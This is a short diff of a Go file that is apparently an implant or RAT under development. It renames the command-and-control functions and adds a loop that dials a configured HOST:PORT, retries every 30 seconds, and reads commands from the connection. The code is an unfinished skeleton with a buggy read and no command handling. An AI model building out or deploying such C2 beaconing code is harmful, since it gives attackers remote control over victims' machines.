@@ -21,23 +21,26 @@ func has_internet_access() bool {
 	return err == nil
 }
 
-func c2_comms(conn net.Conn) {
-
-}
-
-func connect_to_c2() {
+func reach_command_and_control() {
 	if has_internet_access() {
 		addr := fmt.Sprintf("%s:%d", HOST, PORT)
 		conn, err := net.Dial("tcp", addr)
 		if err != nil {
 			time.Sleep(time.Second * 30)
-			connect_to_c2()
+			reach_command_and_control()
 		} else {
 			// communication with C2
-			c2_comms(conn)
+			engage_via(conn)
 		}
 	} else {
 		time.Sleep(time.Second * 30)
-		connect_to_c2()
+		reach_command_and_control()
+	}
+}
+
+func engage_via(conn net.Conn) {
+	for {
+		var cmd []byte
+		conn.Read(cmd)
 	}
 }
